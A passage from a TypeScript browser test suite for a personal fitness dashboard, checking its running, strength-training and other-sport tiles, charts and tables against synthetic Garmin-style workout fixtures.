      { hash: "#running" },
    );
    const chips = await page.$$eval("[data-id=workoutTrend] .chip", (b) =>
      b.map((x) => x.textContent),
    );
    expect(chips).toContain("Tempo Run (6)");
    expect(chips.some((c) => c?.includes(" - "))).toBe(false);
  });

  it("leaves out an interval session without work laps, so reps compare with reps", async () => {
    const intervals = data.activities.filter((a: { name: string }) => a.name === "Track Intervals");
    const oldest = intervals.at(-1);
    const activities = data.activities.map((a: object) =>
      a === oldest ? { ...a, laps: undefined } : a,
    );
    const { page } = await open(
      browser,
      pageFile({
        data: { ...data, activities, v: DASHBOARD_VERSION },
        settings: { workouts: true },
      }),
      { hash: "#running" },
    );
    const tile = "[data-id=workoutTrend]";
    await page.click(`${tile} >> text=Track Intervals (6)`);
    await page.click(`${tile} >> text=Long Run (10)`);
    expect(await page.$$eval(`${tile} table.data tbody tr`, (r) => r.length)).toBe(5);
    expect(await page.textContent(tile)).toContain(
      "Track Intervals: 1 session has no work laps and is left out, so reps compare with reps.",
    );
    // the oldest session left out: the compared ones start with the next one
    expect(await page.textContent(tile)).toContain("The sessions with work laps start on Aug 27.");
  });

  it("lets a workout go, but keeps at least one", async () => {
    const { page } = await open(browser, pageFile({ settings: { workouts: true } }), {
      hash: "#running",
    });
    const tile = "[data-id=workoutTrend]";
    const kpis = () => page.$$eval(`${tile} .kpi-label`, (k) => k.map((x) => x.textContent));
    await page.click(`${tile} >> text=Track Intervals (6)`);
    await page.click(`${tile} >> text=Long Run (10)`);
    expect(await kpis()).toEqual(["Track Intervals"]);
    await page.click(`${tile} >> text=Track Intervals (6)`);
    expect(await kpis()).toEqual(["Track Intervals"]);
  });

  it.each([
    ["50%", ["hit", "miss"], "▲ 25 pts (better) vs first session"],
    // a relative change has no base at 0%: the points still show the change
    ["0%", ["miss", "miss"], "▲ 75 pts (better) vs first session"],
    ["100%", ["hit", "hit"], "▼ 25 pts (worse) vs first session"],
    // no change: no arrow, no colour
    ["75%", ["hit", "hit", "hit", "miss"], "0 pts vs first session"],
    // one planned session: nothing to compare with
    ["n/a", null, null],
  ])(
    "shows the laps on target of a planned workout, its change in points from %s",
    async (from: string, oldest: string[] | null, change: string | null) => {
      // newest first: the newest session 3 of 4 laps on target, one with no plan, one not read
      const intervals = data.activities.filter(
        (a: { name: string }) => a.name === "Track Intervals",
      );
      const verdicts = (i: number) =>
        i === 0
          ? ["hit", "hit", "hit", "miss"].map(planRow)
          : i === intervals.length - 1
            ? (oldest?.map(planRow) ?? null)
            : i === 2
              ? undefined
              : null;
      const activities = data.activities.map((a: object) =>
        intervals.includes(a) ? { ...a, planVerdicts: verdicts(intervals.indexOf(a)) } : a,
      );
      const { page, errors } = await open(
        browser,
        pageFile({
          data: { ...data, activities, v: DASHBOARD_VERSION },
          settings: { workouts: true },
        }),
        { hash: "#running" },
      );
      const tile = "[data-id=workoutTrend]";
      const buttons = () =>
        page.$$eval(`${tile} .picker button`, (b) => b.map((x) => x.textContent));
      // Long Run has no planned session: no metric for it
      expect(await buttons()).not.toContain("Laps on target");
      await page.click(`${tile} >> text=Track Intervals (6)`);
      await page.click(`${tile} >> text=Long Run (10)`);
      expect(await buttons()).toContain("Laps on target");
      await page.click(`${tile} >> text=Laps on target`);
      expect(await kpiTexts(page, "workoutTrend")).toEqual({
        "Track Intervals": ["75%", change],
      });
      // a session without a verdict lap is a gap in the line, never 0
      const line = await chartDataset(page, "workoutTrend", "Track Intervals");
      expect(line.data.filter((v) => v !== null)).toEqual(
        oldest ? [Number(from.slice(0, -1)), 75] : [75],
      );
      expect(line.spanGaps).toBe(true);
      const head = await page.$$eval(`${tile} table.data th`, (h) => h.map((x) => x.textContent));
      expect(head.slice(-3)).toEqual(["Laps on target", "Reps", "Fade"]);
      expect(
        await page.$$eval(`${tile} table.data tbody tr`, (r) =>
          r.map((x) => x.children[x.children.length - 3].textContent),
        ),
      ).toEqual(["75%", "n/a", "n/a", "n/a", "n/a", from]);
      expect(errors).toEqual([]);
    },
  );

  it("covers the edge cases of the run widgets", async () => {
    // without HR zones, the efficiency counts every run, and says so
    let { page } = await open(
      browser,
      pageFile({ data: { ...data, zones: [], v: DASHBOARD_VERSION } }),
      { hash: "#running" },
    );
    expect(await page.textContent("[data-id=aerobicFitness]")).toContain("counts every run");
    // one week: no first and last weeks to compare, no trend of best efforts
    ({ page } = await open(browser, pageFile(), { hash: "#running@2026-10-19_2026-10-19" }));
    expect(await page.$$eval("[data-id=aerobicFitness] .kpi", (k) => k.length)).toBe(0);
    expect(await page.$$eval("[data-id=bestEfforts] canvas", (c) => c.length)).toBe(0);
    // laps without HR: the long runs have no drift
    const noHr = data.activities.map((a: { laps?: Record<string, unknown>[] }) =>
      a.laps ? { ...a, laps: a.laps.map((l) => without(l, ["avgHR"])) } : a,
    );
    ({ page } = await open(
      browser,
      pageFile({ data: { ...data, activities: noHr, v: DASHBOARD_VERSION } }),
      { hash: "#running" },
    ));
    const drift = await page.$$eval("[data-id=longRuns] table.data tbody tr", (r) =>
      r.map((x) => x.children[5].textContent),
    );
    expect(drift.length).toBeGreaterThan(0);
    expect(new Set(drift)).toEqual(new Set(["n/a"]));
  });

  it("says when fitness has too little data before the window, and shows nothing without load", async () => {
    let { page } = await open(
      browser,
      pageFile({ data: { ...data, previousActivities: [], v: DASHBOARD_VERSION } }),
    );
    expect(await page.textContent("[data-id=fitnessFatigue]")).toContain(
      "The data starts less than 6 weeks before this window",
    );
    ({ page } = await open(
      browser,
      pageFile({
        data: {
          ...data,
          activities: data.activities.map((a: object) => without(a, ["trainingLoad", "avgHR"])),
          previousActivities: data.previousActivities.map((a: object) =>
            without(a, ["trainingLoad", "avgHR"]),
          ),
          v: DASHBOARD_VERSION,
        },
      }),
    ));
    expect(await page.$$eval("[data-id=fitnessFatigue] .empty", (e) => e.length)).toBe(1);
  });

  it("shows the fitness, fatigue and form of the window, with the HR estimate and the window end", async () => {
    const maxHR = zonesOf(data.zones).maxHR;
    const every = [...data.activities, ...data.previousActivities];
    // the full window: the digest's values
    const full = await open(browser, pageFile());
    const ff = digest({ ...data }).fitnessFatigue!;
    const shown = await kpiTexts(full.page, "fitnessFatigue");
    expect(shown).toEqual({
      "Fitness · 42 days": [whole.format(ff.fitness), null],
      "Fatigue · 7 days": [whole.format(ff.fatigue), null],
      Form: [whole.format(ff.form), null],
    });
    expect(shown.Form).not.toEqual(shown["Fatigue · 7 days"]);
    // estimated loads only: the HR estimate needs the max HR of the zones
    const estimated = {
      ...data,
      activities: data.activities.map(noGarminLoad),
      previousActivities: data.previousActivities.map(noGarminLoad),
      v: DASHBOARD_VERSION,
    };
    const est = await open(browser, pageFile({ data: estimated }));
    const estFf = fitnessFatigueFrom(
      [...estimated.activities, ...estimated.previousActivities],
      data.start,
      data.end,
      maxHR,
    )!;
    expect(await kpiTexts(est.page, "fitnessFatigue")).toEqual(fitnessTiles(estFf));
    // an older window ends on the Sunday of its last week, not at the end of the data
    const old = await open(browser, pageFile(), { hash: "#all@2026-08-03_2026-08-31" });
    const oldFf = fitnessFatigueFrom(every, "2026-08-03", "2026-09-06", maxHR)!;
    const oldShown = await kpiTexts(old.page, "fitnessFatigue");
    expect(oldShown).toEqual(fitnessTiles(oldFf));
    expect(oldShown["Fitness · 42 days"]).not.toEqual(shown["Fitness · 42 days"]);
    expect([...full.errors, ...est.errors, ...old.errors]).toEqual([]);
  });

  it("says how to compare workouts when no run name repeats", async () => {
    const activities = data.activities.map((a: object, i: number) => ({ ...a, name: `Run ${i}` }));
    const { page } = await open(
      browser,
      pageFile({
        data: { ...data, activities, v: DASHBOARD_VERSION },
        settings: { workouts: true },
      }),
      { hash: "#running" },
    );
    expect(await page.textContent("[data-id=workoutTrend]")).toContain("No run name repeats");
  });

  it("says one session so far instead of a trend", async () => {
    const ride = data.activities.find((a: { type: string }) => a.type === "cycling");
    const { page } = await open(
      browser,
      pageFile({ data: { ...data, activities: [ride], v: DASHBOARD_VERSION } }),
      { hash: "#cycling" },
    );
    expect(await page.textContent("[data-id=typeWeekly]")).toContain("One session so far");
    expect(await page.textContent("[data-id=typeKpis]")).toContain("One session so far");
  });
});

/** The sets with `field` set to 0. */
const zero = (sets: Record<string, unknown>[], field: string) =>
  sets.map((s) => ({ ...s, [field]: 0 }));

const rows = (page: Page) => page.$$eval(".ex-row .linkish", (r) => r.map((x) => x.textContent));

const hit = (exercise: string) => ({ exercise, verdict: "hit" });
const miss = (exercise: string, ...why: string[]) => ({ exercise, verdict: "miss", why });

/**
 * The plan verdicts of the fixture's strength sessions, by day. A day with `null` had no plan, a day
 * with "no sets" lost its sets; the other sessions keep no `planVerdicts` key.
 */
function planned(days: Record<string, unknown>): unknown[] {
  return data.activities.map((a: Record<string, unknown>) => {
    const day = String(a.start).slice(0, 10);
    if (!(day in days)) return a;
    if (days[day] === "no sets") return { ...a, exercises: undefined };
    return { ...a, planVerdicts: days[day] };
  });
}

// weeks 08-03 to 09-28 have no plan, 10-05 has 7 hits and 2 misses, 10-12 has a session without
// sets, 10-19 has 3 hits and 6 misses, 10-26 (the last week, from the page end) has no session
const PLANNED = {
  "2026-10-05": [
    hit("Barbell Back Squat"),
    hit("Barbell Back Squat"),
    hit("Barbell Bench Press"),
    hit("Bent Over Row"),
    hit("Plank"),
  ],
  "2026-10-09": [
    miss("Romanian Deadlift", "sets"),
    hit("Dumbbell Shoulder Press"),
    hit("Lat Pulldown"),
    hit("Dumbbell Biceps Curl"),
    hit("Dumbbell Lunge"),
    miss("Dumbbell Lunge", "reps"),
  ],
  "2026-10-12": null,
  "2026-10-16": "no sets",
  "2026-10-19": [
    hit("Barbell Back Squat"),
    miss("Barbell Bench Press", "sets"),
    miss("Bent Over Row", "reps"),
    hit("Plank"),
  ],
  "2026-10-23": [
    miss("Romanian Deadlift", "sets", "reps"),
    miss("Dumbbell Shoulder Press", "reps"),
    miss("Lat Pulldown", "sets"),
    miss("Dumbbell Biceps Curl", "reps"),
    hit("Dumbbell Lunge"),
  ],
};

const SKIPPED =
  "Only the sessions you did: a skipped planned session leaves no file and is not counted.";

const planPage = (activities: unknown[]) =>
  open(browser, pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }), {
    hash: "#strengthTraining",
  });

const missedRows = (page: Page) =>
  page.$$eval("[data-id=planAdherence] table.data tbody tr", (r) =>
    r.map((tr) => [...tr.querySelectorAll("td")].map((td) => td.textContent)),
  );

describe("plan adherence", () => {
  it("counts the planned exercises hit and missed by week, and lists the ones missed most", async () => {
    const { page, errors } = await planPage(planned(PLANNED));
    expect(await kpiTexts(page, "planAdherence")).toEqual({
      "Planned sessions": ["4", null],
      "Exercises hit": ["10", null],
      "Exercises missed": ["8", null],
      "Hit share": ["56%", null],
    });
    // a week without a planned session is 0, the week with a session without sets is a gap
    const none = Array(9).fill(0);
    expect((await chartDataset(page, "planAdherence", "Exercises hit")).data).toEqual([
      ...none,
      7,
      null,
      3,
      0,
    ]);
    expect((await chartDataset(page, "planAdherence", "Exercises missed")).data).toEqual([
      ...none,
      2,
      null,
      6,
      0,
    ]);
    const colours = await page.evaluate(() => {
      const css = getComputedStyle(document.documentElement);
      const sets = Object.values(window.Chart!.instances)
        .filter((c) => c.canvas.closest("[data-widget=planAdherence]"))
        .flatMap((c) => c.data.datasets.map((d) => [d.label, d.backgroundColor]));
      return {
        sets,
        good: css.getPropertyValue("--good").trim(),
        bad: css.getPropertyValue("--bad").trim(),
      };
    });
    expect(colours.sets).toEqual([
      ["Exercises hit", colours.good],
      ["Exercises missed", colours.bad],
    ]);
    // the weeks of the sets chart, stacked on both axes
    const axes = await page.evaluate(() => {
      const charts = Object.values(window.Chart!.instances);
      const c = charts.find((x) => x.canvas.closest("[data-widget=planAdherence]"))!;
      const sets = charts.find((x) => x.canvas.closest("[data-widget=setsPerCategory]"))!;
      const scales = c.options.scales as Record<string, { stacked?: boolean }>;
      return {
        labels: c.data.labels,
        sets: sets.data.labels,
        stacked: [scales.x?.stacked, scales.y?.stacked],
      };
    });
    expect(axes.labels).toHaveLength(13);
    expect(axes.labels).toEqual(axes.sets);
    expect(axes.stacked).toEqual([true, true]);
    // the counts align right, the exercise name does not
    expect(
      await page.$$eval("[data-id=planAdherence] table.data tbody tr:first-child td", (c) =>
        c.map((x) => x.className),
      ),
    ).toEqual(["", "num", "num", "num"]);
    // 7 exercises missed: the first 5, most misses first, then by name
    expect(
      await page.$$eval("[data-id=planAdherence] table.data th", (h) =>
        h.map((x) => x.textContent),
      ),
    ).toEqual(["Exercise", "Missed", "Too few sets", "Reps under the plan"]);
    expect(await missedRows(page)).toEqual([
      ["Romanian Deadlift", "2 of 2", "2", "1"],
      ["Barbell Bench Press", "1 of 2", "1", "0"],
      ["Bent Over Row", "1 of 2", "0", "1"],
      ["Dumbbell Biceps Curl", "1 of 2", "0", "1"],
      ["Dumbbell Lunge", "1 of 2", "0", "1"],
    ]);
    const text = await page.innerText("[data-id=planAdherence]");
    expect(text).toContain(SKIPPED);
    expect(text).toContain(
      "1 strength session has no sets (past the 30 newest without a saved .FIT file, or not readable): its week is left out.",
    );
    expect(errors).toEqual([]);
  });

  it("draws no chart for one week with a plan, and lists no exercise when none missed", async () => {
    const { page, errors } = await planPage(
      planned({ "2026-10-19": [hit("Barbell Back Squat"), hit("Plank")] }),
    );
    expect(await page.$$("[data-id=planAdherence] canvas")).toHaveLength(0);
    expect(await kpiTexts(page, "planAdherence")).toEqual({
      "Planned sessions": ["1", null],
      "Exercises hit": ["2", null],
      "Exercises missed": ["0", null],
      "Hit share": ["100%", null],
    });
    expect(await page.$$("[data-id=planAdherence] table")).toHaveLength(0);
    expect(await page.innerText("[data-id=planAdherence]")).toContain(SKIPPED);
    expect(errors).toEqual([]);
  });

  it("draws the chart from two weeks with a plan", async () => {
    const { page, errors } = await planPage(
      planned({ "2026-10-12": [hit("Plank")], "2026-10-19": [miss("Plank", "sets")] }),
    );
    expect(await page.$$("[data-id=planAdherence] canvas")).toHaveLength(1);
    expect(await missedRows(page)).toEqual([["Plank", "1 of 2", "1", "0"]]);
    expect(errors).toEqual([]);
  });

  it("gives n/a as the hit share of planned sessions without a verdict", async () => {
    const { page, errors } = await planPage(planned({ "2026-10-19": [], "2026-10-12": [] }));
    expect(await kpiTexts(page, "planAdherence")).toEqual({
      "Planned sessions": ["2", null],
      "Exercises hit": ["0", null],
      "Exercises missed": ["0", null],
      "Hit share": ["n/a", null],
    });
    expect(errors).toEqual([]);
  });

  it.each([
    ["no session has plan verdicts", {}],
    ["every session had no plan", { "2026-10-19": null, "2026-10-23": null }],
  ])("shows the empty state when %s", async (_, days) => {
    const { page, errors } = await planPage(planned(days));
    expect(await page.$$("[data-id=planAdherence] canvas")).toHaveLength(0);
    expect(await page.$$("[data-id=planAdherence] .kpi")).toHaveLength(0);
    expect(await page.innerText("[data-id=planAdherence] .empty")).toBe(
      "No planned strength session in this period.",
    );
    expect(await page.innerText("[data-id=planAdherence]")).toContain(SKIPPED);
    expect(errors).toEqual([]);
  });
});

describe("strength board", () => {
  it("shows the Strength widgets", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    expect(await tiles(page)).toEqual([
      "typeKpis",
      "typeWeekly",
      "hrZones",
      "records",
      "setsPerCategory",
      "muscleBalance",
      "planAdherence",
      "exercises",
      "strengthSessions",
    ]);
    expect(await rows(page)).toHaveLength(9);
    expect(await page.textContent("[data-id=muscleBalance]")).toMatch(
      /Push : pull sets\s*[\d.]+ : 1/,
    );
    expect(errors).toEqual([]);
  });

  it("shows n/a in the exercises table for a value the sets do not give, and leaves out a skipped exercise", async () => {
    const activities = data.activities.map((a: Record<string, unknown>) => {
      const ex = a.exercises as { exercise: string; sets: Record<string, unknown>[] }[] | undefined;
      if (!ex) return a;
      // the newest session skipped the lat pulldown: every set has 0 reps
      if (String(a.start).startsWith("2026-10-23"))
        return {
          ...a,
          exercises: ex.map((e) =>
            e.exercise === "Lat Pulldown" ? { ...e, sets: zero(e.sets, "reps") } : e,
          ),
        };
      // the newest squats without weight, and pull-ups done once
      if (String(a.start).startsWith("2026-10-19"))
        return {
          ...a,
          exercises: [
            ...ex.map((e) =>
              e.exercise === "Barbell Back Squat" ? { ...e, sets: zero(e.sets, "kg") } : e,
            ),
            { exercise: "Pull Up", primaryMuscles: ["Lats"], sets: [{ reps: 8 }] },
          ],
        };
      return a;
    });
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
      { hash: "#strengthTraining" },
    );
    // sessions, last, top set, best est. 1RM, change
    const cells = (slug: string) =>
      page.$$eval(`[data-exercise=${slug}] td`, (c) => c.slice(1, 6).map((x) => x.textContent));
    const pulldown = await cells("lat-pulldown");
    const deadlift = await cells("romanian-deadlift");
    // the deadlift was done in the same sessions, up to the newest
    expect([pulldown[0], pulldown[1]]).toEqual([String(Number(deadlift[0]) - 1), "Oct 16"]);
    expect((await cells("barbell-back-squat"))[2]).toBe("n/a");
    expect((await cells("plank"))[3]).toBe("n/a");
    expect(await cells("pull-up")).toEqual(["1", "Oct 19", "8 reps", "n/a", "n/a"]);
    expect(errors).toEqual([]);
  });

  it("leaves out a session without sets and says so, and has no note when every session has sets", async () => {
    const note = /strength session has no sets/;
    const full = await open(browser, pageFile(), { hash: "#strengthTraining" });
    expect(await full.page.innerText("[data-id=setsPerCategory]")).not.toMatch(note);
    // the oldest strength session lost its sets, as one past the 30 newest
    const oldest = data.activities.findLastIndex((a: { type: string }) =>
      a.type.includes("strength"),
    );
    const activities = data.activities.map((a: Record<string, unknown>, i: number) =>
      i === oldest ? { ...a, exercises: undefined } : a,
    );
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
      { hash: "#strengthTraining" },
    );
    for (const id of ["setsPerCategory", "muscleBalance"])
      expect(await page.innerText(`[data-id=${id}]`)).toContain(
        "1 strength session has no sets (past the 30 newest without a saved .FIT file, or not readable): its week is left out.",
      );
    expect(await page.innerText("[data-id=exercises]")).toContain("1 strength session has no sets");
    expect(errors).toEqual([]);
  });

  it("tags a lift whose last sessions are more than 5% under the ones before as down", async () => {
    // once a week: the 3 newest bench press sessions are the last 14 days, at 80% of their weight
    let newest = 3;
    const activities = data.activities.map((a: Record<string, unknown>) => {
      const ex = a.exercises as { exercise: string; sets: { kg?: number }[] }[] | undefined;
      if (!ex?.some((e) => e.exercise === "Barbell Bench Press") || newest-- <= 0) return a;
      return {
        ...a,
        exercises: ex.map((e) =>
          e.exercise === "Barbell Bench Press"
            ? { ...e, sets: e.sets.map((s) => ({ ...s, kg: (s.kg ?? 0) * 0.8 })) }
            : e,
        ),
      };
    });
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
      { hash: "#strengthTraining" },
    );
    const tag = page.locator("[data-exercise=barbell-bench-press] td:first-child .tag");
    expect(await tag.textContent()).toBe("down");
    expect(await tag.getAttribute("title")).toBe(
      "The best of the last sessions (14 days or more) is more than 5% under the best of as many sessions before them",
    );
    expect(errors).toEqual([]);
  });

  it("says why it shows nothing when no session has sets, instead of bars of 0", async () => {
    // for example when Garmin's .FIT download fails for every session
    const activities = data.activities.map((a: Record<string, unknown>) =>
      Array.isArray(a.exercises) ? { ...a, exercises: undefined, detailError: "HTTP 500" } : a,
    );
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
      { hash: "#strengthTraining" },
    );
    for (const id of ["setsPerCategory", "muscleBalance", "exercises"]) {
      expect(await page.$$(`[data-id=${id}] canvas`)).toHaveLength(0);
      expect(await page.innerText(`[data-id=${id}] .empty`)).toMatch(
        /^24 strength sessions have no sets/,
      );
    }
    expect(errors).toEqual([]);
  });

  it("tags the stalled lifts next to their name and says what the change compares", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    // the tag is the lift's state now, apart from the change since its first sessions
    const tagged = await page.$$eval(".ex-row td:first-child .tag", (t) =>
      t.map((x) => [
        x.parentElement!.querySelector(".linkish")!.textContent,
        x.textContent,
        (x as HTMLElement).title,
      ]),
    );
    // the plank is timed: it gets no tag
    expect(tagged).toEqual([
      [
        "Barbell Bench Press",
        "stalled",
        "No new best in the last sessions (14 days or more) against as many sessions before them",
      ],
    ]);
    expect(await page.innerText("[data-id=exercises]")).toContain(
      "Change: the best of the last 3 sessions against the best of the first 3",
    );
    expect(errors).toEqual([]);
  });

  it("searches, filters by group, and a second click on the chip shows all groups", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    await page.fill(".search", "squat");
    expect(await rows(page)).toEqual(["Barbell Back Squat"]);
    await page.fill(".search", "");
    await page.click("[data-id=exercises] .chips >> text=Shoulders");
    expect(await rows(page)).toEqual(["Dumbbell Shoulder Press"]);
    await page.click("[data-id=exercises] .chips >> text=Shoulders");
    expect(await rows(page)).toHaveLength(9);
  });

  it("sorts by a column, and a second click turns the order", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    const sort = () => page.getAttribute("[data-id=exercises] th[aria-sort]", "aria-sort");
    await page.click("[data-id=exercises] .sort >> text=Best est. 1RM");
    expect(await sort()).toBe("descending");
    await page.click("[data-id=exercises] .sort >> text=Best est. 1RM");
    expect(await sort()).toBe("ascending");
  });

  it("opens an exercise with a name in another script, and keeps it in the hash", async () => {
    const renamed: Record<string, string> = { Plank: "Планка", "Lat Pulldown": "腹筋" };
    const activities = data.activities.map((a: Record<string, unknown>) =>
      Array.isArray(a.exercises)
        ? {
            ...a,
            exercises: a.exercises.map((e: { exercise: string }) => ({
              ...e,
              exercise: renamed[e.exercise] ?? e.exercise,
            })),
          }
        : a,
    );
    const file = pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } });
    const { page, errors } = await open(browser, file, { hash: "#strengthTraining" });
    await page.click("[data-exercise='腹筋']");
    expect(await page.textContent(".detail h3")).toBe("腹筋");
    expect(decodeURIComponent(await hash(page))).toMatch(/\/腹筋$/);
    expect(await page.getAttribute("[data-exercise='планка']", "data-exercise")).toBe("планка");

    const again = await open(browser, file, { hash: await hash(page) });
    expect(await again.page.textContent(".detail h3")).toBe("腹筋");
    expect(errors).toEqual([]);
  });

  it("opens an exercise with a click or Enter, keeps it in the hash, and closes it with a second click", async () => {
    const file = pageFile();
    const { page, errors } = await open(browser, file, { hash: "#strengthTraining" });
    await page.click("[data-exercise=barbell-back-squat]");
    expect(await hash(page)).toMatch(/^#strengthTraining@.+\/barbell-back-squat$/);
    expect(await page.textContent(".detail h3")).toBe("Barbell Back Squat");
    expect(await page.$$eval(".detail .ex-sessions > li", (l) => l.length)).toBe(12);
    expect(await chartsWithoutTooltip(page)).toEqual([]);
    await page.click("[data-exercise=barbell-back-squat]");
    expect(await page.$(".detail")).toBeNull();

    await page.focus("[data-exercise=plank] button");
    await page.keyboard.press("Enter");
    expect(await page.textContent(".detail h3")).toBe("Plank");
    // focus goes to the detail, which opens after the table
    expect(await page.evaluate(() => document.activeElement?.textContent)).toBe("Plank");

    const again = await open(browser, file, {
      hash: "#strengthTraining@2026-08-03_2026-10-26/lat-pulldown",
    });
    expect(await again.page.textContent(".detail h3")).toBe("Lat Pulldown");
    expect(errors).toEqual([]);
  });

  it("opens and closes a session", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    const first = "[data-id=strengthSessions] details >> nth=0";
    await page.click(`${first} >> summary`);
    expect(await page.getAttribute(first, "open")).toBe("");
    await page.click(`${first} >> summary`);
    expect(await page.getAttribute(first, "open")).toBeNull();
  });

  it("shows the last six sessions first, newest on top", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    const summaries = () =>
      page.$$eval("[data-id=strengthSessions] details:not([hidden]) summary", (s) =>
        s.map((x) => x.textContent),
      );
    const shown = await summaries();
    expect(shown).toHaveLength(10);
    expect(shown[0]).toMatch(/^Oct 23/);
    await page.click("[data-id=strengthSessions] >> text=Show all 24");
    expect(await summaries()).toHaveLength(24);
  });
});

const summary = async (prevStart: string, activities: unknown[]) => {
  const { page } = await open(
    browser,
    pageFile({ data: { ...data, v: DASHBOARD_VERSION, prevStart, activities } }),
    { hash: "#hiking" },
  );
  return page.innerText("[data-id=typeKpis] .kpi >> nth=0");
};

const easyRun = (id: number, start: string) => ({
  id,
  name: "Easy Run",
  type: "running",
  sport: "running",
  start: `${start} 07:00:00`,
  km: 8,
  duration: "48:00",
  pace: "6:00/km",
  avgHR: 120,
});

describe("walk, hike, bike, swim and racket sport boards", () => {
  const hike = {
    id: 9001,
    name: "Ridge Hike",
    type: "hiking",
    sport: "hiking",
    start: "2026-10-25 09:00:00",
    km: 12,
    duration: "3:00:00",
    ascentM: 900,
    avgHR: 120,
    maxHR: 150,
    trainingLoad: 120,
  };
  const swim = {
    id: 9002,
    name: "Pool Swim",
    type: "lap_swimming",
    sport: "swimming",
    start: "2026-10-24 07:00:00",
    km: 1.5,
    duration: "30:00",
    swolf: 38,
    lengths: 60,
    strokes: 900,
    poolLengthM: 25,
    avgHR: 130,
    trainingLoad: 40,
  };

  /** The sessions of every kind of board: `count` of each, one hour long. */
  const everySport = (count: number) => {
    const sessions = [
      { name: "Easy Run", type: "running", sport: "running", km: 8, pace: "6:00/km" },
      { name: "Night Walk", type: "walking", sport: "walking", km: 3, steps: 4000 },
      { name: "Ridge Hike", type: "hiking", sport: "hiking", km: 12, ascentM: 900 },
      { name: "Road Ride", type: "road_biking", sport: "cycling", km: 40, ascentM: 300 },
      { ...swim, id: undefined, start: undefined },
      { name: "Club Tennis", type: "tennis", sport: "racket" },
      // a sport without widgets of its own, and one with no known SDK sport
      { name: "Ski Day", type: "resort_skiing", sport: "alpineSkiing", km: 30 },
      { name: "Yoga", type: "yoga" },
      {
        name: "Strength A",
        type: "strength_training",
        sport: "fitnessEquipment",
        exercises: [{ exercise: "Push Up", category: "Push Up", sets: [{ reps: 10 }] }],
      },
    ];
    return sessions.flatMap((s, i) =>
      Array.from({ length: count }, (_, n) => ({
        duration: "1:00:00",
        avgHR: 130,
        ...s,
        id: 20_000 + i * 100 + n,
        start: `${addDays("2026-10-25", -n)} 0${i}:00:00`,
      })),
    );
  };
  const tennis = {
    id: 9004,
    name: "Club Tennis",
    type: "tennis",
    sport: "racket",
    start: "2026-10-22 19:00:00",
    duration: "40:00",
    elapsed: "1:30:00",
    avgHR: 140,
    maxHR: 178,
    trainingLoad: 95,
  };
  // no SDK sport known for this type: it goes to the Other board
  const yoga = {
    id: 9003,
    name: "Yoga",
    type: "yoga",
    start: "2026-10-23 19:00:00",
    duration: "45:00",
    avgHR: 90,
  };
  const ski = {
    id: 9005,
    name: "Ski Day",
    type: "resort_skiing",
    sport: "alpineSkiing",
    start: "2026-10-21 10:00:00",
    km: 30,
    duration: "3:00:00",
    avgHR: 120,
  };
  const more = () =>
    pageFile({
      data: {
        ...data,
        v: DASHBOARD_VERSION,
        activities: [hike, swim, yoga, tennis, ski, ...data.activities],
      },
    });

  it("adds a tab for each other sport in the data, and the Other tab last", async () => {
    const { page } = await open(browser, more());
    expect((await tabs(page)).map(([tab]) => tab)).toEqual([
      "all",
      "recovery",
      "running",
      "strengthTraining",
      "walking",
      "hiking",
      "cycling",
      "swimming",
      "racket",
      "alpineSkiing",
      "generic",
    ]);
    expect(await page.textContent("[data-tab=alpineSkiing] span")).toBe("Alpine skiing");
    expect(await page.textContent("[data-tab=generic] span")).toBe("Other");
    // a sport of an icon family has that icon, not the generic one of Other
    const d = (tab: string) => page.getAttribute(`[data-tab=${tab}] path`, "d");
    expect(await d("alpineSkiing")).not.toBe(await d("generic"));
  });

  it("gives a new sport the board of the Other tab", async () => {
    const { page, errors } = await open(browser, more(), { hash: "#alpineSkiing" });
    expect(await tiles(page)).toEqual([
      "typeKpis",
      "typeWeekly",
      "hrZones",
      "records",
      "activities",
    ]);
    expect(await page.textContent("[data-tab=alpineSkiing] .count")).toBe("1");
    expect(await chartsWithoutTooltip(page)).toEqual([]);
    expect(errors).toEqual([]);
  });

  it("draws the bars and the period row of another sport", async () => {
    // a board with a single session shows a note instead of the chart, so give it two
    const two = pageFile({
      data: {
        ...data,
        v: DASHBOARD_VERSION,
        activities: [{ ...ski, id: 9006, start: "2026-10-14 10:00:00" }, ski, ...data.activities],
      },
    });
    const { page, errors } = await open(browser, two, { hash: "#alpineSkiing" });
    const bars = await page.evaluate(() => {
      const c = Object.values(window.Chart!.instances).find((x) =>
        x.canvas.closest("[data-widget=typeWeekly]"),
      )!;
      return c.data.datasets.filter((d) => d.type === "bar").map((d) => d.label);
    });
    expect(bars).toEqual(["Alpine skiing"]);
    await page.click("[data-tab=all]");
    expect(await page.textContent("[data-widget=periodComparison]")).toContain("Alpine skiing");
    expect(errors).toEqual([]);
  });

  it("adds a widget to another sport's board with that sport as its type", async () => {
    const { page } = await open(browser, more(), { hash: "#alpineSkiing" });
    await startEdit(page);
    await page.click(".edit-bar >> text=Add widget");
    const select = page.locator(".catalogue li:has-text('Weekly volume') select");
    expect(await select.inputValue()).toBe("alpineSkiing");
  });

  it("draws every extra board without errors, with a tooltip on every chart", async () => {
    const { page, errors } = await open(browser, more());
    for (const tab of ["walking", "hiking", "cycling", "swimming", "racket", "generic"]) {
      await page.click(`[data-tab=${tab}]`);
      expect([tab, await chartsWithoutTooltip(page)]).toEqual([tab, []]);
    }
    expect(errors).toEqual([]);
  });

  const hikes = (...back: number[]) =>
    back.map((n, i) => ({
      ...hike,
      id: 30_000 + i,
      start: `${addDays("2026-10-25", -n)} 09:00:00`,
    }));
  it("says that the change of a summary tile is the last 7 days, and needs 4 weeks before them", async () => {
    // 2 hikes in the last 7 days against 2 in the 4 weeks before: 300% over their mean week
